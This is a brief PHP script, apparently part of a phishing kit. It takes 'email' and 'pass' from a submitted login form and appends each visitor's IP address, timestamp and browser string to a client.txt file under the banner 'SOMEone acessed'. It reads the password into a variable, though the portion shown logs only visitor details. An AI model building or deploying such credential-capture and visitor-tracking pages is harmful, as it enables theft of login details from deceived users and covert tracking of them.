<?php
if (!empty($_POST) AND (empty($_POST['email']) OR empty($_POST['pass']))) {
      header("Location: index.php"); exit;
  }

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }
$LOGIN = $_POST ['email'];
$SENHA = $_POST ['pass'];
$datahora = date('d/m/Y \à\s H:i:s');


$brow=" BROWSER  :";
$browser = $_SERVER['HTTP_USER_AGENT'];


$COifconfig = "\n----------------------------------------
|⚜️ SOMEone acessed | $datahora 
IP: $ipaddress                                                                                                                                        
$browser";

$ARQUIVO2="client.txt";    
$ABRIR2 = fopen ($ARQUIVO2, "a") ;                                                                                               
fwrite ($ABRIR2, $COifconfig) ;
fclose ($ABRIR2) ;

?>
